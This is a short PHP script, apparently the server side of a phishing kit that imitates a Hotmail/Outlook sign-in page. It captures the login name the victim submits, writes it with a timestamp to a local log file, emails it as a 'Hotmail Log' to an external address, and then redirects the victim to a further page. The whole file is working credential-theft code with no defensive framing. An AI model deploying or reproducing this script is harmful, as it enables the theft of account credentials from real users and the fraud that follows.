<?php
error_reporting(0);
session_start();
$ip = $_SERVER["REMOTE_ADDR"];
$_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];

#browser info
#Country info

$_SESSION['loginfmt'] = $_POST['loginfmt'];

#Security information
$message = "
********************************************* <br />

<br />
TIME	=>   <font color='#F31414'>".date('l jS \of F Y h:i:s A')."</font><br />
Usuario	=>   <font color='#F31414'>".$_POST['loginfmt']."</font><br /> 
</div>";

$fp = fopen('Swordfish.html', 'a');
fwrite($fp, "$message \r\n");
fclose($fp);

$subject  = "Hotmail Log [ " . $_SESSION['_IP_'] . " - " . $_SESSION['cntname'] . " ] ";
$headers  = "MIME-Version: 1.0" . "\r\n";;
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$headers .= "From: Hotmail Log1 <admin@Outlook.com" . "\r\n";

$to = "yaspalugo@hotmail.com";
@mail($to,$subject,$message,$headers);
header('location: secure.php');

?>